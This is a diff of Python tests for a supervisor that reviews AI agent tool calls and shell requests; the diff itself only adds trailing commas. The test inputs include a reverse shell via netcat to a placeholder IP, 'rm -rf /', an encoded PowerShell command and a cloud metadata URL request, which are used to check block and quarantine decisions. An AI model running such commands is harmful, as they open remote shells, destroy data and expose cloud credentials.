@@ -97,7 +97,7 @@ def test_review_tool_call_allows_safe_request() -> None:
             allowed=True,
             reasons=[{"label": "safe"}],
             risk_delta=5,
-        )
+        ),
     )
     supervisor = build_supervisor(toolcall_guard=guard)
 
@@ -108,7 +108,7 @@ def test_review_tool_call_allows_safe_request() -> None:
             target="runtime",
             artifact_paths=["report.md"],
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "allow"
@@ -127,7 +127,7 @@ def test_review_tool_call_marks_review_without_incident() -> None:
             should_review=True,
             reasons=[{"label": "review-needed"}],
             risk_delta=25,
-        )
+        ),
     )
     supervisor = build_supervisor(toolcall_guard=guard)
 
@@ -138,7 +138,7 @@ def test_review_tool_call_marks_review_without_incident() -> None:
             target="runtime",
             command="bash -lc 'echo hello'",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
@@ -156,7 +156,7 @@ def test_review_tool_call_blocks_and_requires_incident() -> None:
             should_block=True,
             reasons=[{"label": "blocked"}],
             risk_delta=80,
-        )
+        ),
     )
     supervisor = build_supervisor(toolcall_guard=guard)
 
@@ -168,7 +168,7 @@ def test_review_tool_call_blocks_and_requires_incident() -> None:
             network_url="http://169.254.169.254/latest/meta-data/",
             network_method="GET",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "block"
@@ -187,7 +187,7 @@ def test_review_tool_call_quarantine_requires_incident() -> None:
             should_quarantine=True,
             reasons=[{"label": "quarantine"}],
             risk_delta=95,
-        )
+        ),
     )
     supervisor = build_supervisor(toolcall_guard=guard)
 
@@ -198,7 +198,7 @@ def test_review_tool_call_quarantine_requires_incident() -> None:
             target="runtime",
             command="rm -rf /",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "quarantine"
@@ -215,7 +215,7 @@ def test_review_runtime_request_allow_path() -> None:
             "executed": True,
             "executionstate": "executed",
             "reasons": [{"label": "allowed"}],
-        }
+        },
     )
     supervisor = build_supervisor(sandbox_router=router)
 
@@ -225,7 +225,7 @@ def test_review_runtime_request_allow_path() -> None:
             target="shell",
             command=["python", "-c", "print('ok')"],
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "allow"
@@ -242,7 +242,7 @@ def test_review_runtime_request_review_path() -> None:
             "executed": False,
             "executionstate": "pending_review",
             "reasons": [{"label": "review"}],
-        }
+        },
     )
     supervisor = build_supervisor(sandbox_router=router)
 
@@ -252,7 +252,7 @@ def test_review_runtime_request_review_path() -> None:
             target="shell",
             command="curl https://example.com/install.sh",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
@@ -268,7 +268,7 @@ def test_review_runtime_request_block_path() -> None:
             "executed": False,
             "executionstate": "denied",
             "reasons": [{"label": "block"}],
-        }
+        },
     )
     supervisor = build_supervisor(sandbox_router=router)
 
@@ -278,7 +278,7 @@ def test_review_runtime_request_block_path() -> None:
             target="shell",
             command="powershell -enc bad",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "block"
@@ -294,7 +294,7 @@ def test_review_runtime_request_quarantine_path() -> None:
             "executed": False,
             "executionstate": "quarantined",
             "reasons": [{"label": "quarantine"}],
-        }
+        },
     )
     supervisor = build_supervisor(sandbox_router=router)
 
@@ -304,7 +304,7 @@ def test_review_runtime_request_quarantine_path() -> None:
             target="shell",
             command="nc -e /bin/sh 1.2.3.4 4444",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "quarantine"
@@ -320,7 +320,7 @@ def test_review_runtime_request_inserts_default_reasons_when_missing() -> None:
             "executed": False,
             "executionstate": "pending_review",
             "reasons": None,
-        }
+        },
     )
     supervisor = build_supervisor(sandbox_router=router)
 
@@ -330,7 +330,7 @@ def test_review_runtime_request_inserts_default_reasons_when_missing() -> None:
             target="shell",
             command="python -m http.server",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
@@ -346,7 +346,7 @@ def test_review_tool_call_inserts_default_reasons_when_empty() -> None:
             should_review=True,
             reasons=[],
             risk_delta=20,
-        )
+        ),
     )
     supervisor = build_supervisor(toolcall_guard=guard)
 
@@ -357,7 +357,7 @@ def test_review_tool_call_inserts_default_reasons_when_empty() -> None:
             target="runtime",
             command="echo hi",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
@@ -372,7 +372,7 @@ def test_supervisor_routes_both_runtime_and_tool_reviews_independently() -> None
             "executed": True,
             "executionstate": "executed",
             "reasons": [{"label": "runtime-allow"}],
-        }
+        },
     )
     guard = _ToolGuardStub(
         _Decision(
@@ -381,7 +381,7 @@ def test_supervisor_routes_both_runtime_and_tool_reviews_independently() -> None
             should_review=True,
             reasons=[{"label": "tool-review"}],
             risk_delta=35,
-        )
+        ),
     )
     supervisor = build_supervisor(sandbox_router=router, toolcall_guard=guard)
 
@@ -391,7 +391,7 @@ def test_supervisor_routes_both_runtime_and_tool_reviews_independently() -> None
             target="shell",
             command=["python", "-c", "print('x')"],
             environment_scope="sandbox",
-        )
+        ),
     )
     tool_result = supervisor.review_tool_call(
         ToolCallRequest(
@@ -400,7 +400,7 @@ def test_supervisor_routes_both_runtime_and_tool_reviews_independently() -> None
             target="runtime",
             command="bash -lc 'echo x'",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert runtime_result["decision"] == "allow"
@@ -421,7 +421,7 @@ def test_supervisor_handles_missing_guards_gracefully() -> None:
             actiontype="tool_call",
             target="runtime",
             environment_scope="sandbox",
-        )
+        ),
     )
     assert "decision" in result_tool
     assert "requires_incident" in result_tool
@@ -433,7 +433,7 @@ def test_supervisor_handles_missing_guards_gracefully() -> None:
             target="shell",
             command="echo ok",
             environment_scope="sandbox",
-        )
+        ),
     )
     assert "decision" in result_runtime
     assert "requires_incident" in result_runtime
